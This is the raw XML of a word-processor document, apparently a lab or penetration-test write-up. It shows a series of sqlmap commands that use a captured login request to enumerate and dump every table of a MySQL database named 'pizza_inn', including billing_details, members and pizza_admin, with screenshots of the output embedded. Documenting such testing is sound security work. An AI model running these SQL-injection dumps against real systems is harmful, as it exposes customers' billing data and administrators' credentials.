        <w:t>sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -tables</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01945F79" w14:textId="77777777" w:rsidR="00C50609" w:rsidRPr="002D16F2" w:rsidRDefault="00C50609" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7E41812E" wp14:editId="3205CCA1">
            <wp:extent cx="4198620" cy="3665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98620" cy="3665220"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="341F445A" w14:textId="77777777" w:rsidR="003342CF" w:rsidRDefault="002D16F2" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>sql</w:t>
      </w:r>
      <w:r w:rsidR="00383179" w:rsidRPr="00383179">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>map -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T billing_details --dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E8E0EA8" w14:textId="77777777" w:rsidR="003342CF" w:rsidRDefault="00383179" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="23880D57" wp14:editId="357475B5">
            <wp:extent cx="5943600" cy="610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10235"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD51FD5" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7D32F392" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T cart_details --dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B731A6" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4FD475F2" wp14:editId="24BDB2E9">
            <wp:extent cx="4762500" cy="72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2500" cy="723900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CF86413" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="402424A3" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T categories --dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="459E6518" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1C856100" wp14:editId="43E6F3FF">
            <wp:extent cx="2400300" cy="714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00300" cy="714375"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6899286D" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56B0CE37" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T currencies</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57E3EE0B" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0E2B63EB" wp14:editId="31A4DF86">
            <wp:extent cx="3095625" cy="733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5625" cy="733425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E300292" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="72DF8E6D" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>food_details -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0567E150" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1D1FF784" wp14:editId="6E6742A4">
            <wp:extent cx="5943600" cy="37515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51580"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D3B7B52" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6DF70102" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>members -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37EE8C42" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0A74768E" wp14:editId="30F4EB7F">
            <wp:extent cx="6210529" cy="75565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63"/>
                    <a:stretch/>
                  </pic:blipFill>
                  <pic:spPr bwMode="auto">
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6445832" cy="784284"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                    <a:extLst>
                      <a:ext uri="{53640926-AAD7-44D8-BBD7-CCE9431645EC}">
                        <a14:shadowObscured xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main"/>
                      </a:ext>
                    </a:extLst>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5587946B" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4D55C1E9" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>messages -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFCD6D7" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3EFB2CAC" wp14:editId="44ED8B8A">
            <wp:extent cx="5943600" cy="4235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3545"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CAF616" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>order</w:t>
      </w:r>
      <w:r w:rsidR="00C50609">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>_details -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="604F66C2" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="680F0ACB" wp14:editId="241DE989">
            <wp:extent cx="5943600" cy="6261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26110"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6126063A" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0AC9D28A" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>partyhalls -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B9EA815" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2A94F3CE" wp14:editId="2F59E0CE">
            <wp:extent cx="2571750" cy="76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762000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="10A3376D" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60920592" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>pizza_admin -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CEC9BFC" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="261216CE" wp14:editId="1F0199C1">
            <wp:extent cx="2647950" cy="752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752475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C290C9A" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DD56C07" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>polls_details -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F9E1A98" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1B744E71" wp14:editId="57F209E9">
            <wp:extent cx="5448300" cy="1333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48300" cy="1333500"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6EE8B9" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CE2E131" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>quantities -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46E5E26D" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7B7306B5" wp14:editId="06D55082">
            <wp:extent cx="2476500" cy="723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723900"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C2C5054" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B129376" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>questions -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22AFF3E8" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="407E3D5B" wp14:editId="46049364">
            <wp:extent cx="3162300" cy="733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2300" cy="733425"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="532CBD2F" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="76628CDC" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>ratings -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DC2DD7E" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="38973A2C" wp14:editId="1C9F7178">
            <wp:extent cx="1790700" cy="752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0700" cy="752475"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="77B7F121" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66AA6E54" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>reservations_details -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="335789B9" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2BD0C703" wp14:editId="036F7D55">
            <wp:extent cx="5943600" cy="5257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25780"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="404B45B0" w14:textId="77777777" w:rsidR="00C50609" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="22BD55B8" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="002D16F2" w:rsidP="002D16F2">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">sqlmap -r /root/Desktop/login.txt --dbms mysql -D pizza_inn -T </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>specials -</w:t>
      </w:r>
      <w:r w:rsidRPr="002D16F2">
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
        <w:t>-dump</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="548E3315" w14:textId="77777777" w:rsidR="002D16F2" w:rsidRDefault="00C50609" w:rsidP="00DA102C">
      <w:pPr>
        <w:rPr>
          <w:lang w:eastAsia="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6727E50B" wp14:editId="008AB58F">
            <wp:extent cx="5943600" cy="4724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72440"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
